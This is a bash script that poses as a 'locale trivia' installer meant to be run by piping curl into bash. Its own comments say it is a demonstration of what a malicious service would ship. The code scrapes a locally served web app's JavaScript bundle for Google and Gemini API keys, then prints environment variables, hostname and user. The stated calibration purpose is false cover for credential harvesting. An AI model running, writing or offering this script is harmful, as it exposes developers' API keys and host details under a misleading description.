#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -u

# Step A: discover the actual bundle path. In dev Vite serves /src/App.tsx
# directly. In prod, server.ts serves the static build from dist/ and falls
# back to dist/index.html for any unknown path (SPA fallback) — so the real
# bundle URL is the <script src="..."> in the served index.html, typically
# /assets/index-<hash>.js after `vite build`.
INDEX=$(curl -s "http://localhost:3000/" 2>/dev/null || true)
BUNDLE_PATH=$(printf '%s' "$INDEX" | grep -oE 'src="/assets/[^"]+\.js"' | head -1 | sed -E 's|^src="||;s|"$||')
if [ -z "${BUNDLE_PATH:-}" ]; then
  # Dev fallback: Vite serves the .tsx directly.
  BUNDLE_PATH="/src/App.tsx"
fi

# Step B: fetch the bundle and dump apiKey/GEMINI/AIza context.
echo "# --- bundle path: ${BUNDLE_PATH} ---"
BUNDLE=$(curl -s "http://localhost:3000${BUNDLE_PATH}" 2>/dev/null || true)
AIZA=$(printf '%s' "$BUNDLE" | grep -oE 'AIza[A-Za-z0-9_-]{30,}' | head -1 || true)
echo "  bytes=${#BUNDLE} aiza=[${AIZA}]"
echo "# --- apiKey/GEMINI/AIza context in bundle ---"
printf '%s' "$BUNDLE" \
  | grep -oE '.{0,30}(apiKey|GEMINI_API_KEY|AIza)[^",]{0,60}' \
  | head -n 4 \
  | sed 's/^/  /'

# Step C: env (short; we already know what's here).
echo "# --- env (head) ---"
env | head -n 5
echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
